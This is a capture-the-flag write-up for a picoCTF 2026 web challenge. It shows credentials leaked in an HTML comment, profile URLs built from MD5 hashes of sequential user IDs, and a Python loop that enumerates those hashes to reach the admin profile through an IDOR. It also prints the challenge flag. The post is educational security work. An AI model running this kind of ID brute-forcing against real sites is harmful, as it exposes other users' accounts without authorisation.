---
layout: post
title: "Hashgate"
date: 2026-03-20
categories: [picoctf2026, web]
ctf: picoctf2026
difficulty: Medium
points: 100
author: "matcha / Ding Jie"
description: "Credentials leaked in HTML source, profile URLs use MD5-hashed numeric IDs — brute force the admin's ID to access their profile and get the flag."
---

## Challenge

**Category:** Web · **Points:** 100 · **CTF:** picoCTF 2026

We're given a login page at `crystal-peak.picoctf.net`.

---

## Analysis

**Step 1 — Inspect the page source**

Opening DevTools immediately reveals a comment in the HTML:

```html
<!-- Email: guest@picoctf.org Password: guest -->
```

Logging in with those credentials works and lands us on a user profile page. The URL looks like:

```
/profile/user/53a1320cb5d2f56130ad5222f93da374
```

That long hex string is an MD5 hash. The question is — what's being hashed?

**Step 2 — Identify the hash input**

MD5 of a predictable value is a classic mistake. Given this is a CTF with sequential users, the most likely input is a **numeric user ID**. The guest hash `53a1320cb5d2f56130ad5222f93da374` can be cracked or we can just brute force nearby IDs to find admin.

---

## Approach

Brute force a range of numeric IDs, hash each one with MD5, and try accessing the profile URL:

```python
import requests
import hashlib

base = "http://crystal-peak.picoctf.net:60927/profile/user/"

for i in range(2981, 3021):
    h = hashlib.md5(str(i).encode()).hexdigest()
    r = requests.get(base + h)
    if r.status_code == 200:
        print(f"ID {i} → {h} ✓")
        print(r.text)
        break
```

One of the IDs in that range resolves to the admin profile, which prints:

```
Welcome, admin! Here is the flag: picoCTF{id0r_unl0ck_c642ae68}
```

This is an **IDOR** (Insecure Direct Object Reference) — the profile endpoint has no authorisation check, so any user can access any profile just by knowing (or guessing) the hash.

---

## Key Takeaway

Two vulnerabilities combined here: credentials leaked in an HTML comment, and profile URLs using MD5 of a sequential integer — trivially brute forceable. Profile endpoints must check that the authenticated user owns the requested resource, not just that the hash is valid.

---

## Flag

```
picoCTF{id0r_unl0ck_c642ae68}
```